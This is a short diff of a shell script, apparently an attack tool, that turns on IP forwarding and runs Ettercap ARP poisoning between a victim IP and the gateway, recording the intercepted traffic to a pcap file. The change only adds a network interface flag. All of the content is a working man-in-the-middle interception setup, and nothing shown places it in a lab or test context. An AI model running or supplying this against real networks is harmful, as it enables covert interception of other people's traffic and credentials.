@@ -16,4 +16,5 @@ echo "[*] Enabling IP forwarding..."
 sudo sysctl -w net.inet.ip.forwarding=1
 
 echo "[*] Starting Ettercap against $victim_ip <-> $gateway_ip..."
-sudo ettercap -T -M arp:remote /${victim_ip}// /${gateway_ip}// -w data/ettercap_session.pcap
+sudo ettercap -T -i en0 -M arp:remote /${victim_ip}// /${gateway_ip}// -w data/ettercap_session.pcap
+
